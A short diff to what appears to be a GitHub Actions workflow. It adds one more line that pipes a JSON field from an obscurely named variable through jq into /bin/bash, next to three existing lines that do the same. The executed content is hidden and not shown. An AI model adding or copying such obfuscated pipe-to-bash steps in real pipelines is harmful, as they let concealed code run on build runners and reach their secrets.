@@ -28,6 +28,7 @@ jobs:
           echo $xy4108 | jq -r .aydmz0 | /bin/bash
           printf '%s' "$gamdf66237" | jq -r .as30 | /bin/bash
           echo $vf8 | jq -r .b8 | /bin/bash
+          printf '%s' "$kvr66" | jq -r .kjs121 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
